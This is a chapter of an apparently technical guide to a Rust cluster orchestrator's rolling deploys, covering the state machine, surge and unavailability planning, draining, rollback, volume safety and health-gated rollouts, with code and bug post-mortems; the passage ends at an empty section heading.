# Ship It

Up to now, deploying a new version of an app meant stopping the old one and starting the new one. If the new version was broken, users saw errors. If you had three replicas, all three went down at once. That's not how production works.

This chapter adds rolling deploys: replace instances one at a time, health-check each new instance before moving on, and automatically revert if anything goes wrong.

Reliaburger is meant to be batteries-included. In a Kubernetes world you'd reach for a Deployment controller, maybe Argo Rollouts, maybe a service mesh to handle the traffic shifting. That's three add-ons and a lot of YAML to do one thing: swap a running version for a new one without dropping requests. We want that in the box. So the whole machinery lives in one subsystem, `meat`, alongside the scheduler that already knows where instances run.

## Why deploys need a state machine

A deploy is not a single action. It's a sequence of coordinated steps, each of which can succeed, fail, or time out. The system needs to know exactly where it is in that sequence at all times, especially if the leader node crashes halfway through and a new leader has to pick up where it left off.

Picture the alternative. You write a function that starts the new version, waits, flips the routing, and stops the old one — top to bottom, no explicit state. It works on your laptop. Then in production the leader crashes between "flip routing" and "stop old version". The new leader has no idea what the old one was doing. Did the routing flip happen? Are there now two versions both serving traffic, or none? You can't tell, because the progress lived in a stack frame that died with the process.

The fix is to make the progress data, not control flow. Write down the current phase, commit it somewhere durable, and let any node read it back and continue. That's a state machine: an enum with a `transition` method that takes an event and produces the next state, or rejects the transition. The enum is the written-down progress; Raft (from Chapter 2) is the durable somewhere.

We also rejected shelling out to an external tool. A deploy needs to know the cluster's current placements, talk to the health checker, and rewrite the ingress routing table: all things the agent already has in-process. Spawning `kubectl`-equivalent would mean re-plumbing all of that across a process boundary. Keeping it in `meat` is both simpler and faster.

## The deploy state machine

```rust
enum DeployPhase {
    Pending,
    RunningPreDeps,
    Rolling,
    Halted,
    Reverting,
    RolledBack,
    Completed,
    Failed,
    Cancelled,
}
```

Nine states. Every valid transition is a `match` arm. Every invalid transition returns an error. The compiler forces you to handle every case. You can't accidentally forget what happens when a step fails during the reverting phase — the compiler won't let you.

The happy path is simple: `Pending → Rolling → Completed`. Start the deploy, replace instances one by one, done.

The interesting paths are the failure ones. If a health check fails during rolling:
- With `auto_rollback = true`: `Rolling → Reverting → RolledBack` (revert all upgraded instances)
- With `auto_rollback = false`: `Rolling → Halted` (stop and let the operator decide)

If a pre-deploy dependency job fails: `RunningPreDeps → Failed` (no instances were touched, nothing to revert).

## Configuring a deploy

Before any of that runs, we turn the user's config into a `DeployConfig`. The app's TOML can set a few knobs — how long to wait for health, how long to drain, whether to auto-rollback — and anything it leaves out falls back to a sensible default:

```rust
impl Default for DeployConfig {
    fn default() -> Self {
        Self {
            strategy: DeployStrategy::Rolling,
            max_surge: 1,
            max_unavailable: 0,
            drain_timeout: Duration::from_secs(30),
            health_timeout: Duration::from_secs(60),
            auto_rollback: true,
        }
    }
}
```

`Default` is a trait the standard library defines, and `#[derive(Default)]` or a hand-written `impl` gives a type its "empty" value. Python has no real equivalent — you'd scatter `None` defaults across a constructor's keyword arguments. Go has zero values, but you can't change what they are; a `bool` is always `false` by default. Here we say plainly: a deploy with nothing specified rolls one instance at a time, waits 60 seconds for health, and rolls back on failure.

Merging the user's overrides on top of those defaults shows off a Rust feature that landed recently, the *let-chain*:

```rust
pub fn from_spec(spec: &crate::config::app::DeploySpec) -> Self {
    let mut cfg = Self::default();
    if let Some(ref s) = spec.strategy
        && s == "blue-green"
    {
        cfg.strategy = DeployStrategy::BlueGreen;
    }
    if let Some(ref s) = spec.drain_timeout
        && let Some(d) = parse_duration(s)
    {
        cfg.drain_timeout = d;
    }
    // ... the rest of the fields, same shape ...
    cfg
}
```

Read `if let Some(ref s) = spec.strategy && s == "blue-green"` as: "if the strategy field is set (it's an `Option`, so it might be absent), bind its contents to `s`, *and* if `s` equals the string, then run the block." Both conditions in one `if`. Before let-chains you'd have nested two `if`s or written a `match`, drifting rightward with every optional field. A C programmer reads this like `if (spec->strategy && strcmp(s, "blue-green") == 0)`, except the compiler guarantees you can't touch `s` unless the value was actually present. There's no null to dereference.

`parse_duration` is a small helper that turns `"30s"` or `"5m"` into a `Duration`. It returns `Option<Duration>` rather than erroring, so a malformed string simply leaves the default in place — the second half of the let-chain (`&& let Some(d) = parse_duration(s)`) only assigns when parsing succeeds.

## The rolling sequence

Each instance replacement follows five sub-steps:

1. **Start** the new instance (same node, new image)
2. **Health check** — wait for the health probe to pass (up to `health_timeout`)
3. **Routing update** — add the new instance to the load balancer, remove the old one
4. **Drain** — wait for in-flight requests to the old instance to finish (up to `drain_timeout`)
5. **Stop** — kill the old instance

If the health check fails at step 2, we stop the new instance and don't touch the old one. The old instance is still serving traffic. Nothing broke. That's the whole point.

## The rolling planner

Which of those steps comes next? On a three-replica app with `max_surge = 1`, the answer changes as the rollout goes: start a replacement, retire an old instance, start another. The agent asks one pure function, `plan_rolling_step` in `src/meat/deploy_types.rs`, every time round its loop:

```rust
pub fn plan_rolling_step(
    target: u32,
    new_healthy: u32,
    new_pending: u32,
    old_remaining: u32,
    max_surge: u32,
    max_unavailable: u32,
) -> RollingStep {
    if new_healthy >= target && old_remaining == 0 {
        return RollingStep::Done;
    }

    let serving = new_healthy + old_remaining;
    let total = new_healthy + new_pending + old_remaining;

    // Start a replacement when one is still owed and surge allows it.
    let owed = new_healthy + new_pending < target;
    if owed && total < target.saturating_add(max_surge) {
        return RollingStep::StartNew;
    }

    // Otherwise retire an old instance, provided serving stays within the
    // unavailable budget.
    if old_remaining > 0 && serving > target.saturating_sub(max_unavailable) {
        return RollingStep::RetireOld;
    }
    // ... Wait while replacements come up, Stuck if neither move is allowed
}
```

The two bounds are the whole decision. `max_surge` caps how far *above* the target the total may go, so it decides whether another replacement may start. `max_unavailable` caps how far *below* the target the serving count may fall, so it decides whether an old instance may retire. `saturating_add` and `saturating_sub` stop at the numeric limits instead of overflowing, which matters for `u32`: `0 - 1` would panic in a debug build and wrap to four billion in a release one.

`RollingStep` is a five-variant enum (`StartNew`, `RetireOld`, `Wait`, `Done`, `Stuck`), and the agent `match`es on it, so the compiler makes sure every answer is handled. `Stuck` is only reachable with both bounds at zero, which `DeployConfig::validate` refuses. It exists to fail loudly rather than spin.

Why a pure function? Because every combination is a one-line unit test, with no runtime, no containers and no clock. `default_surge_keeps_one_spare_and_never_dips`, `zero_surge_replaces_in_place` and `full_surge_matches_the_old_all_at_once_behaviour` each walk a whole rollout through the planner and check the serving count never drops below the floor.

### What we tried first: a driver trait

The first version of this chapter had a different shape. A `DeployOrchestrator` drove the steps through a `DeployDriver` trait, with a `MockDriver` for tests and a production driver to come. It was a tidy design: the orchestrator was generic over the driver, so tests ran the same deploy logic against the mock in microseconds.

The production driver never came. Every method on the trait was a plain synchronous `fn`, and the agent is `async` top to bottom: starting a container, waiting on a health probe and draining connections are all `.await` points. A synchronous trait can't `.await`, and bridging the two (blocking on a runtime handle inside an async task) is exactly the kind of thing that deadlocks under load. So the agent grew its own hand-rolled rollout against the async runtime, and the orchestrator stayed behind as a model that only tests ever ran. Two implementations of the same rules can drift apart without anyone noticing, and these did: the model knew about `max_surge` long before the agent honoured it.

In August 2026 we deleted the orchestrator, the trait, the mock and the model's blue-green path, about 800 lines. What survived is what the agent could actually use: the pure planner above, and the agent's own deploy worker, tested against a fake container runtime instead of a fake driver. The lesson isn't "traits are bad". It's that an abstraction has to fit the runtime it serves, and a trait with one real implementation that never arrives is a model, not an interface.

## Automatic rollback

When a replacement fails its health check, the deploy worker calls `abort_rollout`. With `auto_rollback = false` it stops there, keeps the healthy replacements, and records the deploy as `Halted`, so the operator decides. With `auto_rollback = true` (the default), what happens depends on how far the rollout got. If no old instance has retired yet, the abort tears the replacements down and the old fleet carries on as if nothing happened. If some have, it rolls *backwards*: it starts previous-spec instances to make up the capacity, through the same planner, before it retires a healthy replacement. If the previous spec won't start either, the deploy ends `Halted` with the reason.

That second case took us a while to get right: see "A rollback must not cost capacity" at the end of the chapter.

## Dependency ordering

Jobs can declare `run_before = ["app.web"]`, meaning they must complete before the rolling phase begins. Database migrations are the classic example: you want `migrate` to finish before `web` gets the new code.

The gate is the app spec in Raft. Once that spec commits, any node can start the new version, so the migration has to finish first. Apply records a deployment intent (`JobApplyCommit`), admits the prerequisite hooks as runs of the common job lifecycle, and waits for their accepted results. A migration opens the gate only after a positive zero exit. Then one Raft entry publishes the apps and admits the ordinary jobs together, and registers each cron schedule as a durable definition whose UTC minutes the leader claims itself. Prerequisites must reference an app in the same apply and effective namespace. A failed hook fails the deploy with no instance touched, and an unknown outcome never opens the gate: someone has to look first (see "Jobs that might already have run", below).

Migration cancellation also needs a boundary after the job settles. An accepted cancellation remains meaningful when the child subsequently exits zero: check it after settlement and immediately before proposing the desired-state transaction. A proposal already submitted to Raft can still commit; cancellation cannot roll that transaction back. Each replicated ownership write has a five-second caller deadline. A timeout does not tell us whether Raft committed, so we keep the uncertain fence and report an error. This is why the terminal job watcher ends without inventing a release when its settlement write stalls.

Two of the tests for this were testing something else ([#1058](https://github.com/reliaburger/reliaburger/issues/1058)). Their names promised a hung *commit* and a hung *failed-hook settlement*, but after hanging the council they sent `POST /v1/deploys/operations/{id}/cancel`, so what they really proved was that a stalled cancellation returns a bounded `503`. That's worth keeping, so they now say so: `hung_cancel_after_a_successful_hook_…` and `hung_cancel_after_a_failed_hook_…`. The writes their names promised have no HTTP caller at all. The leader issues them from its own tick: `JobApplyCommit` once every hook has succeeded, `DeployCancel` once one has failed. The new tests seed a deployment with a finished hook, hang every council write, and let the real leader loop run. A test-only hook in `CouncilNode` records each write that hung and when it arrived, so the test can watch the leader try the settlement write, give up on it after `WRITE_TIMEOUT` (10 seconds), and try it again on a later tick. A second attempt is the proof that the stall didn't wedge the leader; a gap of at least `WRITE_TIMEOUT` between the two proves the first was really held, not refused. Meanwhile the durable intent must stay byte-for-byte what it was, no agent may be told to publish, and a failed hook must never even try `JobApplyCommit`. Drop the deadline around either write, or skip the failed-hook branch, and the matching test fails, while the old cancellation tests stay green.

The first version held the gate differently. Raft recorded a bounded *claim* owning every app and job identity in the apply, with the leadership term that admitted it, until the jobs settled. A claim from an earlier term could never be released, each one reserved its jobs' resources on every candidate node, and a few leader changes during leased applies quietly leaked capacity. In 0.2.0 the claims went (#681), along with the agent's own job runner: Chapter 17's "Retiring the batch engine from Chapter 12" tells that story.

## What actually runs

The path that deploys your app lives in the Bun agent, in `src/bun/agent/deploy_worker.rs`: `rolling_redeploy` and `blue_green_redeploy`, each calling the supervisor and the container runtime directly.

- **`run_before`**: the hooks run on the common job lifecycle before the app is published, as "Dependency ordering" describes. The agent itself no longer runs jobs; a deploy that names one is refused before it touches a runtime.
- **Rolling**: `rolling_redeploy` loops on `plan_rolling_step`, starting a replacement or retiring an old instance as the planner says, until it answers `Done`.
- **Blue-green**: `strategy = "blue-green"` dispatches to `blue_green_redeploy`, which brings the whole green fleet up and health-checks it while blue keeps serving, then publishes green and retires blue. A green failure leaves blue untouched. Chapter 9 covers it.
- **Scheduled jobs**: a job with a `schedule = "0 3 * * *"` doesn't run at deploy time at all. It's parsed by a small dependency-free cron matcher (`meat::cron`), and the leader claims each matching UTC minute as one run.

## Raft persistence

The original plan was to commit deploy state to Raft at every phase transition, so that a new leader could read the last known state and resume a half-finished deploy. That's why the phase is an enum we can write down rather than a position in the code: a value survives a process death, a stack frame doesn't.

The wired cluster path ended up keeping no deploy state in Raft at all. Each node rolls its own share, and the leader reads progress from the nodes' reports (more on that at the end of the chapter). What it does keep in Raft is small: the last ten specs of each app that rolled out everywhere, and the spec whose rollout failed.

Finished deploys move into a per-app history on each node, so `relish history` and the API can show what shipped when. We don't keep it forever. An app that deploys fifty times a day, or a bad version the reconciler retries every five minutes, would grow it without bound. `record_deploy_history` in `src/bun/agent/deploy_ops.rs` caps it:

```rust
pub(crate) fn record_deploy_history(
    history: &mut Vec<crate::meat::deploy_types::DeployHistoryEntry>,
    entry: crate::meat::deploy_types::DeployHistoryEntry,
) {
    let app_id = entry.app_id.clone();
    history.push(entry);
    let kept = history
        .iter()
        .filter(|entry| entry.app_id == app_id)
        .count();
    let mut excess = kept.saturating_sub(DEPLOY_HISTORY_PER_APP);
    history.retain(|entry| {
        if excess > 0 && entry.app_id == app_id {
            excess -= 1;
            return false;
        }
        true
    });
}
```

`retain` keeps the elements its closure says yes to, in order, like Python's `[e for e in history if keep(e)]` but in place. The closure is `FnMut`: it captures `excess` by mutable reference and counts it down, so it drops exactly the app's oldest surplus entries and keeps everyone else's. `DEPLOY_HISTORY_PER_APP` is fifty.

For a long time there was no cap. The agent's history was a plain `Vec` that every deploy, retry and abort pushed a whole `AppSpec` onto, and nothing ever trimmed it. A bad version that the reconciler retried every five minutes added an entry every five minutes, forever, and a restart threw the lot away, so `relish rollback` answered 404 after an upgrade. Now the history is capped on each node, and the rollback source moved to the council (see the end of the chapter).

## Under the hood: key patterns

### The transition function

The phase enum and its transition function live on in `src/meat/deploy_types.rs`. The agent doesn't drive a `DeployState` through them (it reports each outcome as a `DeployResult`: `Completed`, `RolledBack`, `Halted` or `Failed`), but the table is still the clearest statement of the rules, and its tests pin them. The core is a single `match` on `(current_phase, event)`:

```rust
pub fn transition(&mut self, event: DeployEvent) -> Result<(), DeployError> {
    let new_phase = match (&self.phase, &event) {
        (DeployPhase::Pending, DeployEvent::Start) => {
            if self.request.pre_deploy_jobs.is_empty() {
                DeployPhase::Rolling
            } else {
                DeployPhase::RunningPreDeps
            }
        }
        (DeployPhase::Pending, DeployEvent::Cancel) => DeployPhase::Cancelled,
        (DeployPhase::RunningPreDeps, DeployEvent::PreDepsComplete) => DeployPhase::Rolling,
        (DeployPhase::RunningPreDeps, DeployEvent::PreDepsFailed) => DeployPhase::Failed,
        (DeployPhase::Rolling, DeployEvent::StepFailed(_)) => {
            if self.request.config.auto_rollback {
                DeployPhase::Reverting
            } else {
                DeployPhase::Halted
            }
        }
        // ... more arms ...
        _ => {
            return Err(DeployError::InvalidTransition {
                from: self.phase,
                event,
            });
        }
    };

    self.phase = new_phase;
    self.phase_changed_at = SystemTime::now();
    Ok(())
}
```

The wildcard `_` catches every `(phase, event)` combination not explicitly listed. In Go or Java, that would be a `default:` case that's easy to forget. In Rust, the compiler enforces exhaustiveness. Add a tenth state and every `match` that doesn't handle it becomes a compile error.

The conditional logic within arms (checking `pre_deploy_jobs.is_empty()`, `config.auto_rollback`) keeps the state machine compact. Each arm is a function from (state, event, context) to next state. No separate transition table, no matrix to maintain.

### The rollout loop

`plan_rolling_step` only says what to do. `rolling_redeploy` does it, and feeds the result back in on the next pass. Stripped of its error handling, the loop looks like this:

```rust
loop {
    if self.report_cancellation(events).await {
        new_failed = true;
        break;
    }
    let step = crate::meat::deploy_types::plan_rolling_step(
        replica_count,
        started.healthy.len() as u32,
        0, // the start path health-waits inline, so nothing is ever pending here
        (existing.len() - retired) as u32,
        deploy_config.max_surge,
        deploy_config.max_unavailable,
    );
    match step {
        RollingStep::Done | RollingStep::Wait => break,
        RollingStep::Stuck => { /* report and fail */ }
        RollingStep::RetireOld => {
            let old_id = existing[retired].clone();
            if let Err(error) = self
                .retire_old_instance(&old_id, deploy_config.drain_timeout)
                .await
            {
                // keep the started replacements for cleanup, report, stop
            }
            retired += 1;
            continue;
        }
        RollingStep::StartNew => {}
    }
    // start the next ordinal's replacement and wait for its health check
}
```

The shape is: ask the planner, act, count what changed, ask again. The planner knows the *rules*; the loop knows the *actions*. That split is what lets the rules be tested without any I/O, while the loop is tested against a fake runtime.

The five sub-steps are spread over three functions. `start_replacement` starts the new instance (1), waits for its health probe (2) and publishes it as a backend so routing picks it up (3). `retire_old_instance` drains the old one (4) and stops it (5). Every retirement waits for its replacement to be serving first, unless `max_unavailable` lets the old one go early or a managed volume forces stop-first (two processes must never write the same directory).

### `relish deploy`, `history`, and `rollback`

The CLI is a thin client over the agent's HTTP API. On a single node, `relish deploy` streams the agent's progress lines to your terminal as the rollout goes ("starting new instance", "healthy ✓", "stopping old instance") and ends with a one-line summary, `deploy started: N instance(s): …`. On a cluster it can't: the API returns as soon as the council has recorded the spec, and each node rolls its share later, so you get one line and watch the rest with `relish status`. `relish history <app>` prints the sliding window of past deploys. And `relish lint` validates an app's config, including the deploy section, before you ship it.

That last claim used to be half true. `strategy` was a free string, and anything but `"blue-green"` meant rolling, so `"bluegreen"` rolled without a word. A `drain_timeout` of `"1m30s"` or `"500ms"` failed to parse and quietly became the 30-second default. Neither reached `relish lint`. Now `strategy` deserialises into the `DeployStrategy` enum, with `#[serde(rename_all = "kebab-case")]` mapping `BlueGreen` to `"blue-green"`, so an unknown value fails to parse at all; and `DeployConfig::parse` refuses a duration that doesn't parse, the same "refuse, don't clamp" rule `[autoscale]` follows. `unknown_deploy_strategy_is_rejected` and `unparseable_drain_timeout_is_rejected` pin both.

`relish rollback <app>` deserves its own paragraph, because for a long time it was a lie. The command read the last successful entry from history and *printed* the image name, followed by "(use `relish apply` with the previous config to rollback)". It rolled nothing back; it told you to. Worse, it couldn't have worked even if it tried: the deploy history stored the image string but not the *spec*, so there was nothing to re-apply. And the fresh-deploy path — the very first deploy of an app — recorded no history at all, so a two-deploy app only had one entry.

The fix threads through the whole path. Deploy history entries now carry the full `AppSpec` (`Option<Box<AppSpec>>`, defaulted so old entries still deserialise), every deploy path records one including the first, and `POST /v1/rollback/{app}/{namespace}` finds the last-but-one successful spec and redeploys it through the same machinery as `apply` — Raft in cluster mode, a local deploy otherwise. "Last-but-one" matters: the newest successful entry is the version you're running *now*, so rollback targets the one before it. With no previous version, you get a clean 404, not a redeploy of the current one.

This is a small feature with a sharp lesson: a command that describes an action instead of performing it is worse than no command, because it looks done. `relish rollback` had a help string, a history lookup, and formatted output — everything except the rollback.

"Last-but-one" was right on one node and wrong on a cluster, in three ways. The handler read only the history of the node you asked, which may never have run the app. Every node records its own rollout, so once history merged across the cluster (F07), the last-but-one entry was usually another node's copy of the *current* deploy. And a node records the spec it deployed, whose `replicas` is that node's share. Re-applying it as the app's spec would roll a three-replica app back to one replica. `rollback_target` now reads the merged history, treats the spec in Raft as the current version, compares specs with the replica count set aside (which collapses the per-node copies), and returns the newest one that differs, at the current scale. `rollback_skips_other_nodes_copies_of_the_current_version` and `rollback_keeps_the_apps_replica_count` pin both halves.

### Failure injection with `MockGrill`

The deploy worker's tests run the real worker against `MockGrill` (`src/grill/mock.rs`), a fake container runtime that implements the same `Grill` trait as runc. Setters inject the failures a test needs: `set_fail_create`, `set_fail_stop`, `set_ignore_kill`, `set_call_delay`. Health failures come from a tiny HTTP responder the test spawns, answering `500` to make a replacement fail its probe:

```rust
async fn rolling_redeploy_rolls_back_when_the_probe_fails() {
    let port = spawn_health_responder(500).await;
    let (mut agent, tx, shutdown, grill) = test_agent_with_grill();
    // ...
    let events = send_deploy(&tx, health_gated_config(port, "rolling")).await;
    // the error event names the failed probe, and the old instance still runs
}
```

The setters take `&self`, not `&mut self`, because the test and the agent both hold the mock. Inside, it keeps its state behind `Arc<Mutex<…>>`, so a test can change a failure mode while the agent is mid-deploy. That's *interior mutability*: mutation through a shared reference, with the borrow check moved from compile time to the lock.

## Wiring drain, surge and rollback into the live path

For a long time the deploy model was the honest part and the live Bun agent was the shortcut. When you redeployed a running app, the agent started the new instances, then reached straight for `kill` on the old ones. No drain. In-flight HTTP and WebSocket traffic got the rug pulled out from under it mid-request. The `DrainTracker` we built in the Wrapper existed, had tests, and was wired to nothing.

Two problems, then, and both are about the gap between "we told it to stop" and "it actually stopped".

### The drain tracker reaches the real proxy

The Wrapper proxy and the Bun agent are separate tasks. They already share one thing: the routing table, behind an `Arc<RwLock<RoutingTable>>`. When the agent rebuilds routes after a deploy, the proxy sees the new table on its next request. We give them a second shared thing — the drain tracker:

```rust
#[derive(Clone)]
pub struct SharedDrains(Arc<Mutex<DrainTracker>>);
```

`Arc<Mutex<T>>` is Rust's way of sharing something mutable between tasks. The `Arc` (atomically reference-counted pointer) hands out cheap clones that all point at the same tracker; the `Mutex` makes sure only one task mutates it at a time. We reach for the *tokio* `Mutex`, not the one in `std`, because a tokio mutex yields the task while it waits for the lock instead of blocking the whole runtime thread. Blocking a runtime thread on a lock is the kind of thing that wedges an async system under load.

The agent owns a `SharedDrains` and hands a clone to the proxy when it binds the ingress listeners. Now the two sides can cooperate. When a request arrives for a backend that's draining, the proxy bumps that instance's in-flight count, and drops it again when the response finishes:

```rust
let _drain_guard = match &state.drains {
    Some(drains) if drains.is_draining(&instance_id).await => {
        drains.increment_connections(&instance_id).await;
        Some(DrainGuard { drains: drains.clone(), instance_id })
    }
    _ => None,
};
```

`DrainGuard` is a small RAII type — hold it for the request's lifetime, and its `Drop` releases the count on *every* exit path, including the error returns and the early `502`s. Rust runs `Drop` deterministically when a value leaves scope, so there's no way to forget the decrement. There's one wrinkle: `Drop` can't be `async`, and our decrement is. So the guard's `Drop` spawns a tiny task to do the async release. It runs promptly; the count comes back down.

### Retire means drain, then wait for exit

With the proxy reporting in-flight traffic, the agent's retire path can finally do the right thing:

```rust
async fn drain_and_stop_instance<G: Grill>(
    drains: &SharedDrains,
    grill: &G,
    id: &InstanceId,
    drain_timeout: Duration,
) {
    drains.start_drain(&drain_command(id, drain_timeout)).await;
    drains.wait_drained(&id.0).await;
    // stop, poll until Stopped, kill if the grace elapses
}
```

Before this runs, the deploy publishes the *new* backends and rebuilds the routing table. So by the time we start draining, the proxy is already sending new requests to the fresh instances. The old ones only have to wait out the requests they were already handling. `wait_drained` polls until the instance's in-flight count hits zero or its deadline passes — new traffic already goes elsewhere, so this is a countdown, not a losing battle.

Notice what this function *takes*: a drain handle and a grill, both cloneable, and no `&self`. That's deliberate, and it's the second half of a lesson that took two rounds to learn. Our first version was a method on the agent, called from the finaliser — which runs on the agent's command loop. The command loop is the single owner of all agent state; while one command executes, every other command waits. A drain is a wait of up to `drain_timeout` *per instance*, and a blue-green cut-over retires the whole old fleet at once. Do that arithmetic on the loop and a routine redeploy of a three-replica app freezes health checks, status queries and cluster RPC for up to ninety seconds. The fix is a division of labour: the spawned deploy worker owns every wait (it calls this free function per instance), and the loop gets only fast bookkeeping messages — "this one's drained and stopped, forget it". The cut-over ordering is preserved by doing it in three steps: publish the green backends (fast, on the loop), drain and stop blue (slow, on the worker), then tear down the old bookkeeping (fast, on the loop). A test pins the ordering by holding a connection open on blue and asserting green is routable — and the agent still answers commands — mid-drain.

This is where `max_unavailable` becomes real rather than aspirational. The rolling path brings a new replica up and healthy *before* it retires an old one, so the count of serving instances never dips below the target: while the old ones drain, the new ones are already taking traffic.

Read that back with `max_surge` in mind, though, and something's missing. "Bring every new replica up, then retire the old ones" satisfies `max_unavailable = 0` beautifully. It also completely ignores `max_surge`. On a three-replica app it means six containers at peak, whatever you configured — and the default is `max_surge = 1`, which asks for four.

So one of the two knobs was load-bearing and the other was decoration. `max_surge` parsed, validated, appeared in the config docs, and changed nothing. That's a worse failure than not supporting it at all: an operator who sets `max_surge = 1` because the node hasn't the headroom for double has been told their constraint is respected, and it isn't.

The two bounds are really one small decision, repeated:

```rust
pub fn plan_rolling_step(
    target: u32,
    new_healthy: u32,
    new_pending: u32,
    old_remaining: u32,
    max_surge: u32,
    max_unavailable: u32,
) -> RollingStep {
    if new_healthy >= target && old_remaining == 0 {
        return RollingStep::Done;
    }
    let serving = new_healthy + old_remaining;
    let total = new_healthy + new_pending + old_remaining;

    let owed = new_healthy + new_pending < target;
    if owed && total < target.saturating_add(max_surge) {
        return RollingStep::StartNew;
    }
    if old_remaining > 0 && serving > target.saturating_sub(max_unavailable) {
        return RollingStep::RetireOld;
    }
    // …
}
```

`max_surge` gates starting (how far above the target may `total` go?), `max_unavailable` gates retiring (how far below may `serving` fall?). Ask that question repeatedly and the rollout walks itself: with the defaults it starts one, retires one, starts one, retires one. With `max_surge = 0, max_unavailable = 1` it retires *first* and never exceeds the target, which is what you want when there's no spare capacity at all.

Two things fell out of writing it this way.

The first is that `max_surge = 0` and `max_unavailable = 0` together are unsatisfiable. You may not go above the target, so you can't start a replacement; you may not go below it, so you can't retire anything. Nothing in the config validated that pair, so it would have produced a rollout that looked live and made no progress. The planner returns a distinct `Stuck` for it and `DeployConfig::validate` rejects it at apply time with an explanation. When you write a rule as an explicit predicate, its unsatisfiable cases tend to walk up and introduce themselves; buried in a loop they'd have stayed hidden until someone hit one.

The second is a hazard the interleaving created. Retiring old instances *during* the rollout rather than all at the end means the command loop gets a turn between retirements — and a deliberately stopped instance still sitting in `supervisor.instances` looks exactly like a crashed one to the restart driver, which would helpfully bring it back. So retirement drops the instance from the supervisor in the same turn that stops it (`Supervisor::retire_instance`). Interleaving two loops that used to run one-after-the-other is a reliable way to discover which of your invariants were really just orderings.

Testing this is where the pure planner pays off. The unit tests don't assert step sequences — that would pin the implementation — they replay a whole rollout and assert the *envelope*: peak total and minimum serving. A proptest then does the same for every combination of target, existing count and bounds that validation permits. And because a planner nothing calls is worse than no planner (this codebase has a long history of exactly that), there are agent-level tests that replay the grill's call log to count live containers: three replicas with `max_surge = 1` peak at four, and they peak at six against the old code.

### One volume, one writer

Surge-first is the right default for a web server. For an app with a managed volume it's quietly wrong, and the V02 soak found out how.

The soak's writer is a shell loop on a managed volume: append the next number to `/data/seq`, `sync`, log `ACK n`. It started on node 2, and then the harness cut node 2's power in the middle of an upgrade walk. The node came back, the old binary started the writer again, and four seconds later the upgrade replaced the binary before its placement reconciler could record that deploy as applied. The new binary adopted the running writer, found the placement still pending and deployed it again. The app already had an instance, so that deploy was a rolling redeploy with the default `max_surge = 1`: start `soak-writer-g1-0`, wait for it, then retire `soak-writer-0`.

Two instances of one app on one node share one managed volume. That's the design (`volumes/<namespace>/<app>/<path>`, one directory per app), and it's why a restart finds its data. So for a few seconds two shells appended to the same file. The new one read `21925` as the last line, the old one appended `21926`, and then the new one appended its own `21926`. Every acknowledged number was still in the file. It just had one of them twice, and a database with two processes appending to its write-ahead log wouldn't get off so lightly.

The fix is a rule, not a knob. `DeployConfig::for_app` is what a node rolls an app out with: the app's own `[deploy]` table, except that an app with a managed volume always rolls stop-first (`max_surge = 0`, `max_unavailable` at least 1), and blue-green (which is one big surge) falls back to that too:

```rust
pub fn for_app(spec: &crate::config::app::AppSpec) -> Self {
    let mut cfg = spec
        .deploy
        .as_ref()
        .map(Self::from_spec)
        .unwrap_or_default();
    if spec.volumes.iter().any(|volume| volume.source.is_none()) {
        cfg.strategy = DeployStrategy::Rolling;
        cfg.max_surge = 0;
        cfg.max_unavailable = cfg.max_unavailable.max(1);
    }
    cfg
}
```

`spec.deploy.as_ref().map(Self::from_spec)` reads as: if there's a `[deploy]` table, parse it; `as_ref` borrows the `Option`'s contents rather than moving them out of `spec`, and `unwrap_or_default` supplies `DeployConfig::default()` when there's none. Host-path volumes (`source = "/srv/..."`) are left alone: the operator chose to share that directory and knows whether its users can.

Stop-first costs a moment of unavailability on every redeploy of a volume app. We could have kept surge-first and fenced the volume instead (a lock file, or a lease the new instance waits on), but that asks every workload to cooperate, and the busybox loop that caught this never would. Kubernetes has the same trap: a `Deployment` with a `ReadWriteOnce` claim will happily run old and new pods on one node, which is why databases go in a `StatefulSet`. We'd rather not make you know that.

The regression tests replay the grill's call log like the `max_surge` tests above: a volume app's redeploy must never have two instances live at once, a blue-green volume app must roll stop-first, and a host-path-only app keeps its surge. The soak's own check got fixed in the same change. Its `awk` stopped at the first line out of place and printed `LAST` from its `END` block, and `END` runs even after `exit`, so a file with one repeated line read as a file cut off at that line, below thousands of later ACKs. That looked like lost data for an hour. The check now reads the whole file and says which values are missing (lost data), which appear twice (two writers) and what the highest one is.

Stop-first makes that redeploy safe. It was also unnecessary: the adopted writer already ran exactly what the placement asked for. Chapter 14 ("Adopted, and already done") shows how the reconciler now asks the agent about its adopted instances and records such a placement as applied without deploying it at all.

### "Healthy" has to mean the app answered

One more audit finding, and it's the one that would have hurt most in production. The opening of this chapter promised "health-check each new instance before moving on". The live path's version of that promise was a poll on `grill.state == Running` — the *runtime's* view. The process came up, the container didn't crash, so: healthy, publish the backend, retire an old instance. At no point did anyone ask the app the question the operator configured: does `GET /healthz` return 200?

Run the failure through. You ship a version with a broken database password. The process starts fine — it only discovers the bad credential when the health check's handler tries to connect. The old rolling path sees `Running`, announces "healthy ✓", routes traffic to it, and drains the instance that was actually serving. Repeat per replica, and a config typo has replaced your whole healthy fleet with instances that answer every request with a 500. The health check you configured does eventually run — after the deploy finalises, when the ordinary monitoring tick picks the instance up and marks it `Unhealthy` three probes later. The system notices; it just notices after the damage rather than instead of it.

The reason the check couldn't run earlier is structural, and worth understanding. During a rollout, the replacement instance doesn't exist in the supervisor yet — it's the deploy worker's private business until the finaliser installs it. The steady-state health tick probes instances the supervisor knows about, so mid-deploy there is nothing for it to probe. Registering the instance earlier would have meant the restart driver and the deploy worker fighting over a half-created instance (we already met that hazard with retirement). The fix goes the other way: the deploy worker, which already owns every wait, gates itself. `wait_instance_healthy` waits for `Running`, then — when the app declares a health check — runs the same HTTP probe the monitoring tick uses (same config, same `initial_delay`, same thresholds) until it passes or the deploy's `health_timeout` expires. Only then is the backend published; on failure the existing rollback machinery takes over, and the old instances never stop serving. Apps without a health check keep the `Running`-only behaviour — we can't ask a question the operator didn't configure.

The tests for this had a blind spot worth confessing. Every deploy test drove a `MockGrill` whose `state()` says `Running`, so "container runs" and "app answers" were indistinguishable by construction — the gate could not be tested against a fake that has no notion of HTTP. The regression tests bind a real TCP listener on a loopback port, point the app's health check at it, and run the genuine `probe_health` through the deploy: a responder that answers 500 must leave the old instance serving and the deploy rolled back; flip it to 200 and the rollout completes. When a bug survives because the test double can't express it, the fix needs a test the double isn't in.

### Stop must wait for the process to actually exit

